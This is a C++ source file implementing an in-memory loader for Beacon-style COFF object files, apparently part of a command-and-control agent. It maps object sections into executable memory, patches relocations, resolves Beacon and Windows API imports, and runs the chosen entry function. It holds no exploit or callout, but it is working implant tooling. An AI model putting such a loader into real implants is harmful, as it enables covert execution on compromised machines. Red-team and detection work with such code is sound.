#include "Boffer.h"
#include "utils.h"

#if defined(__x86_64__) || defined(_WIN64)
char IMP_FUNC[] = "__imp_Beacon";
char IMP_WIDE[] = "__imp_ToWideChar";
int IMP_LENGTH = 6;
int FUNC_LENGTH = 12;
int WIDE_LENGTH = 16;
#else
char IMP_FUNC[] = "__imp__Beacon";
char IMP_WIDE[] = "__imp__ToWideChar";
int IMP_LENGTH = 7;
int FUNC_LENGTH = 13;
int WIDE_LENGTH = 17;
#endif

Boffer::Boffer() {}

void* FindProcBySymbol(char* symbol)
{
	HMODULE hModule = NULL;
	char* moduleName = NULL;
	char* funcName = NULL;

	if (StrNCmpA(symbol, IMP_FUNC, FUNC_LENGTH) == 0 || StrNCmpA(symbol, IMP_WIDE, WIDE_LENGTH) == 0) {
		funcName = symbol + IMP_LENGTH;
		for (int i = 0; i < BeaconFunctionsCount; i++) {
			if (BeaconFunctions[i][0] != NULL) {
				if (StrCmpA(funcName, (char*)BeaconFunctions[i][0]) == 0)
					return BeaconFunctions[i][1];
			}
		}
	}
	else if (StrNCmpA(symbol, IMP_FUNC, IMP_LENGTH) == 0) {
		char symbolCopy[1024] = { 0 };
		memcpy(symbolCopy, symbol, StrLenA(symbol));

		moduleName = symbolCopy + IMP_LENGTH;
		moduleName = StrTokA(moduleName, (CHAR*)"$");
		funcName = StrTokA(NULL, (CHAR*)"$");
		funcName = StrTokA(funcName, (CHAR*)"@");
		hModule = LoadLibraryA(moduleName);
		if (hModule)
			return ApiWin->GetProcAddress(hModule, funcName);
	}
	return NULL;
}

char* PrepareEntryName(char* targetFuncName)
{
#if defined(__x86_64__) || defined(_WIN64)
	return targetFuncName;
#else
	int targetLength = StrLenA(targetFuncName);
	char* entryName = (char*)MemAllocLocal(targetLength + 2);
	if (!entryName)
		return NULL;

	entryName[0] = '_';
	memcpy(entryName + 1, targetFuncName, targetLength + 1);
	return entryName;
#endif
}

void FreeFunctionName(char* targetFuncName)
{
#if !defined(__x86_64__) && !defined(_WIN64)
	MemFreeLocal(&targetFuncName, StrLenA(targetFuncName));
#endif
}

bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSections)
{
	for (int i = 0; i < pHeader->NumberOfSections; i++) {
		COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * i));
		mapSections[i] = (char*)ApiWin->VirtualAlloc(NULL, pSection->SizeOfRawData, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
		if (!mapSections[i] && pSection->SizeOfRawData)
			return FALSE;
		memcpy(mapSections[i], coffFile + pSection->PointerToRawData, pSection->SizeOfRawData);
	}
	return TRUE;
}

void CleanupSections(PCHAR* mapSections, int maxSections)
{
	for (int i = 0; i < maxSections; i++) {
		if (mapSections[i]) {
			ApiWin->VirtualFree(mapSections[i], 0, MEM_RELEASE);
		}
	}
}

bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSections, COF_SYMBOL* pSymbolTable, char* mapFunctions) {
	int mapFunctionsSize = 0;

	for (int sectionIndex = 0; sectionIndex < pHeader->NumberOfSections; sectionIndex++) {
		COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * sectionIndex));
		COF_RELOCATION* pRelocTable = (COF_RELOCATION*)(coffFile + pSection->PointerToRelocations);

		for (int relocIndex = 0; relocIndex < pSection->NumberOfRelocations; relocIndex++) {
			COF_SYMBOL pSymbol = pSymbolTable[pRelocTable->SymbolTableIndex];

			if (pRelocTable->SymbolTableIndex >= pHeader->NumberOfSymbols)
				return FALSE;

			int offset = 0;
#ifdef _WIN64
			unsigned long long bigOffset = 0;
#endif

			if (pSymbol.Name.cName[0] != 0) { // Internal Symbol
				int sectionNumber = pSymbol.SectionNumber - 1;
				if (sectionNumber < 0 || sectionNumber >= pHeader->NumberOfSections)
					return FALSE;

#ifdef _WIN64
				if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR64) {
					memcpy(&bigOffset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(unsigned long long));
					bigOffset += (unsigned long long)mapSections[sectionNumber];
					memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &bigOffset, sizeof(unsigned long long));
				}
				else if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR32NB || pRelocTable->Type == IMAGE_REL_AMD64_REL32) {
					memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
					offset += (int)(mapSections[sectionNumber] - (mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4));
					memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
				}
#else
				memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
				offset += (unsigned int)(mapSections[pSymbolTable[pRelocTable->SymbolTableIndex].SectionNumber - 1]);
				memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(unsigned int));
#endif
			}
			else { // External Symbol
				unsigned int symOffset = pSymbol.Name.dwName[1];
				void* procAddress = FindProcBySymbol(((char*)(pSymbolTable + pHeader->NumberOfSymbols)) + symOffset);
				if (!procAddress)
					return FALSE;

#ifdef _WIN64
				if (pRelocTable->Type == IMAGE_REL_AMD64_REL32) {
					if (((char*)(mapFunctions + mapFunctionsSize * 8) -
						(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4)) > 0xffffffff) {
						return FALSE;
					}
					memcpy(mapFunctions + mapFunctionsSize * 8, &procAddress, sizeof(unsigned long long));
					offset = (int)((mapFunctions + mapFunctionsSize * 8) -
						(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4));
					memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
					mapFunctionsSize++;

					if (mapFunctionsSize * 8 >= MAP_FUNCTIONS_SIZE)
						return FALSE;
				}
#else
				memcpy(mapFunctions + mapFunctionsSize * 4, &procAddress, sizeof(int));
				offset = (int)(mapFunctions + mapFunctionsSize * 4);
				memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
				mapFunctionsSize++;

				if (mapFunctionsSize * 4 >= MAP_FUNCTIONS_SIZE)
					return FALSE;
#endif
			}

			pRelocTable = (COF_RELOCATION*)((char*)pRelocTable + sizeof(COF_RELOCATION));
		}
	}
	return TRUE;
}

bool ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYMBOL* pSymbolTable, COF_HEADER* pHeader, PCHAR* mapSections)
{
	for (int i = 0; i < pHeader->NumberOfSymbols; i++) {
		if (StrCmpA(pSymbolTable[i].Name.cName, entryFuncName) == 0) {
			void(*proc)(char*, unsigned long) = (void(*)(char*, unsigned long)) (mapSections[pSymbolTable[i].SectionNumber - 1] + pSymbolTable[i].Value);
			proc((char*)args, argsSize);
			return TRUE;
		}
	}
	return FALSE;
}

char* ObjectExecute(int* retSize, char* targetFuncName, unsigned char* coffFile, unsigned int cofFileSize, unsigned char* args, int argsSize)
{
	output_size = 0;
	output_offset = 0;

	if (!coffFile || !targetFuncName)
		return 0;

	COF_HEADER* pHeader = (COF_HEADER*)coffFile;
	COF_SYMBOL* pSymbolTable = (COF_SYMBOL*)(coffFile + pHeader->PointerToSymbolTable);

	char* entryFuncName = PrepareEntryName(targetFuncName);
	if (!entryFuncName)
		return 0;

	PCHAR mapSections[MAX_SECTIONS] = { 0 };
	BOOL result = AllocateSections(coffFile, pHeader, mapSections);
	if (!result) {
		FreeFunctionName(entryFuncName);
		return 0;
	}

	char* mapFunctions = (char*)ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
	if (!mapFunctions) {
		CleanupSections(mapSections, MAX_SECTIONS);
		FreeFunctionName(entryFuncName);
		return 0;
	}

	result = ProcessRelocations(coffFile, pHeader, mapSections, pSymbolTable, mapFunctions);
	if (!result) {
		ApiWin->VirtualFree(mapFunctions, 0, MEM_RELEASE);
		CleanupSections(mapSections, MAX_SECTIONS);
		FreeFunctionName(entryFuncName);
		return 0;
	}

	beacon_output = (char*) MemAllocLocal(0);

	ExecuteProc(entryFuncName, args, argsSize, pSymbolTable, pHeader, mapSections);

	ApiWin->VirtualFree(mapFunctions, 0, MEM_RELEASE);
	CleanupSections(mapSections, MAX_SECTIONS);
	FreeFunctionName(entryFuncName);

	*retSize = output_size;
	return beacon_output;
}